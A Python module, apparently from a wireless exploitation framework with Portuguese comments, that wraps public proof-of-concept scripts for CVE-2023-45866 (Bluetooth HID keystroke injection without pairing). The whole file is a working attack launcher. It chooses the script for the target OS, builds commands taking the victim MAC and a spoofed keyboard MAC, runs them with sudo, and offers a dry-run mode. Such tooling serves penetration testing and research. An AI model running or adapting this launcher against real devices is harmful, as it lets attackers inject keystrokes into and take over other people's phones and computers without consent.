#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para marcnewlin/hi_my_name_is_keyboard (CVE-2023-45866).

Invoca os PoCs oficiais de injeção HID Bluetooth por SO (Android/Linux, macOS,
iOS, Windows). O repositório upstream fixa o payload em muitos scripts; as opções
``payload_type`` / ``payload`` orientam o operador e cobrem convenções para
passar o segundo MAC (teclado) quando o PoC exige.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import platform
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import List, Optional, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Ponte subprocess para hi_my_name_is_keyboard (CVE-2023-45866)."""

    __info__ = {
        "name": "Bluetooth HID Keystroke Injection Bridge",
        "description": (
            "Execução dos PoCs hi_my_name_is_keyboard (subprocess): CVE-2023-45866, "
            "injeção de teclas via perfil HID sem pairing explícito no alvo. "
            "Requer clone do repositório, dependências do upstream (BlueZ, injector/) "
            "e hardware adequado. Use apenas em laboratório autorizado."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Marc Newlin / contributors (upstream PoCs, subprocess)",
        ),
        "references": (
            "https://github.com/marcnewlin/hi_my_name_is_keyboard",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-45866",
        ),
        "devices": ("bluetooth", "br_edr", "hid"),
    }

    target_address = OptMAC("", "Endereço Bluetooth da vítima (host que recebe HID)")
    target_os = OptString(
        "auto",
        "SO do alvo: auto | linux | android | macos | windows | ios "
        "(auto usa platform.system() + heurística; Android mapeia para o script Linux)",
    )
    payload_type = OptString(
        "ducky_script",
        "Tipo lógico de payload: ducky_script | raw_keys | shell_command "
        "(documentação operacional; upstream pode exigir edição do script)",
    )
    payload = OptString(
        "",
        "Payload ou MAC secundário: macOS/iOS = MAC do teclado a spoofar; "
        "Windows = MAC do teclado (target_address = PC vítima). Ver README upstream.",
    )
    adapter = OptString("hci0", "Interface HCI local (ex.: hci0, hci1)")
    dry_run = OptBool(False, "Exibe o comando sem executar")

    def _candidate_repo_roots(self) -> List[Path]:
        """Possíveis raízes do clone ``hi_my_name_is_keyboard``."""
        here = Path(__file__).resolve()
        return [
            here.parents[7] / "submodules" / "IoT" / "hi_my_name_is_keyboard",
            here.parents[6] / "submodules" / "IoT" / "hi_my_name_is_keyboard",
            here.parents[5] / "submodules" / "IoT" / "hi_my_name_is_keyboard",
            here.parents[4] / "hi_my_name_is_keyboard",
            here.parents[5] / "hi_my_name_is_keyboard",
        ]

    def _repo_root(self) -> Optional[Path]:
        """Retorna diretório do clone se existir."""
        for p in self._candidate_repo_roots():
            if (p / "injector").is_dir():
                return p.resolve()
        return None

    def _detect_os_key(self) -> str:
        """Deriva chave lógica de SO para escolha de script."""
        sysname = platform.system().lower()
        if sysname == "darwin":
            return "macos"
        if sysname == "windows":
            return "windows"
        if sysname == "linux":
            return "linux"
        return "linux"

    def _normalize_os(self, raw: str) -> str:
        """Normaliza ``target_os`` para chave interna."""
        s = raw.strip().lower()
        if s in ("auto", ""):
            return self._detect_os_key()
        if s == "android":
            return "android"
        if s in ("linux", "macos", "windows", "ios"):
            return s
        raise ValueError("target_os inválido: use auto|linux|android|macos|windows|ios")

    def _parse_keyboard_mac(self) -> str:
        """Extrai MAC do teclado a partir de ``payload`` ou formatos simples."""
        pl = str(self.payload).strip()
        if not pl:
            return ""
        # "keyboard=AA:BB:..." ou primeiro token se parecer MAC
        m = re.search(
            r"(?:keyboard|kbd)\s*[=:]\s*((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})",
            pl,
        )
        if m:
            return m.group(1).upper()
        if re.fullmatch(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", pl):
            return pl.upper()
        return ""

    def _script_and_argv(self, root: Path, os_key: str) -> Tuple[Path, List[str]]:
        """Resolve script PoC e argumentos ``argv`` (sem interpretador)."""
        iface = str(self.adapter).strip()
        if not iface or not re.match(r"^hci\d+$", iface):
            raise ValueError("adapter deve ser hciN (ex.: hci0).")

        target = str(self.target_address).strip()
        if not target:
            raise ValueError("Defina target_address (MAC da vítima).")

        py = shutil.which("python3") or sys.executable or "python3"
        payload_type = str(self.payload_type).strip().lower().replace("-", "_")
        if payload_type not in ("ducky_script", "raw_keys", "shell_command"):
            raise ValueError("payload_type deve ser ducky_script | raw_keys | shell_command.")

        pl = str(self.payload).strip()
        if pl:
            logger.warning(
                "payload definido: os PoCs upstream usam sequências fixas; "
                "payload_type=%s pode exigir adaptação manual no repositório.",
                payload_type,
            )

        if os_key in ("linux", "android"):
            script = root / "keystroke-injection-android-linux.py"
            return script, [py, str(script), "-i", iface, "-t", target]

        if os_key == "macos":
            script = root / "keystroke-injection-macos.py"
            kb = self._parse_keyboard_mac()
            if not kb:
                raise ValueError("macOS exige o MAC do teclado em payload (ex.: AA:BB:...).")
            return script, [py, str(script), "-i", iface, "-t", target, "-k", kb]

        if os_key == "ios":
            script = root / "keystroke-injection-ios.py"
            kb = self._parse_keyboard_mac()
            if not kb:
                raise ValueError("iOS exige o MAC do teclado em payload (ex.: AA:BB:...).")
            return script, [py, str(script), "-i", iface, "-t", target, "-k", kb]

        if os_key == "windows":
            script = root / "windows-poc.py"
            kb_mac = self._parse_keyboard_mac()
            if not kb_mac:
                raise ValueError(
                    "Windows: defina payload com o MAC do teclado (ex.: payload=AA:BB:...); "
                    "target_address é o MAC do computador vítima.",
                )
            return script, [
                py,
                str(script),
                "-i",
                iface,
                "-k",
                kb_mac,
                "-c",
                target,
            ]

        raise ValueError("Combinação OS/script não suportada.")

    def _build_command(self) -> List[str]:
        """Monta linha de comando completa (com ``sudo`` quando aplicável).

        Returns:
            Lista de argumentos para ``subprocess``.

        Raises:
            FileNotFoundError: Clone ausente.
            ValueError: Parâmetros inválidos.
        """
        root = self._repo_root()
        if not root:
            raise FileNotFoundError(
                "Clone hi_my_name_is_keyboard não encontrado. Coloque em "
                "submodules/IoT/hi_my_name_is_keyboard ou ao lado do WirelessXPL-Forge.",
            )

        os_key = self._normalize_os(str(self.target_os))
        if os_key == "android":
            os_key = "linux"

        script, argv = self._script_and_argv(root, os_key)
        if not script.is_file():
            raise FileNotFoundError("Script PoC ausente: {}".format(script))

        if os_key == "windows":
            return argv

        return ["sudo", *argv]

    def run(self) -> None:
        """Executa o PoC selecionado ou registra dry-run."""
        try:
            cmd = self._build_command()
        except (FileNotFoundError, ValueError) as err:
            logger.error("%s", err)
            return

        root = self._repo_root()
        os_key = self._normalize_os(str(self.target_os))
        if str(self.target_os).strip().lower() in ("auto", ""):
            logger.info("target_os=auto → SO efetivo para seleção de script: %s", os_key)

        cmd_str = " ".join(cmd)
        if self.dry_run:
            logger.info("DRY RUN — comando hi_my_name_is_keyboard:")
            logger.info("%s", cmd_str)
            logger.info("cwd sugerido: %s", root)
            return

        logger.info("Executando PoC CVE-2023-45866 (hi_my_name_is_keyboard)...")
        logger.info("%s", cmd_str)
        logger.warning("Uso restrito a equipamento e rede autorizados.")

        cwd = str(root) if root else os.getcwd()
        env = os.environ.copy()
        env.setdefault("PYTHONUNBUFFERED", "1")

        try:
            subprocess.run(cmd, cwd=cwd, env=env, check=False)
        except KeyboardInterrupt:
            logger.info("Interrompido pelo usuário.")
        except Exception as exc:
            logger.error("Falha ao executar subprocess: %s", exc)
            logger.exception("bt_hid_injection_bridge")
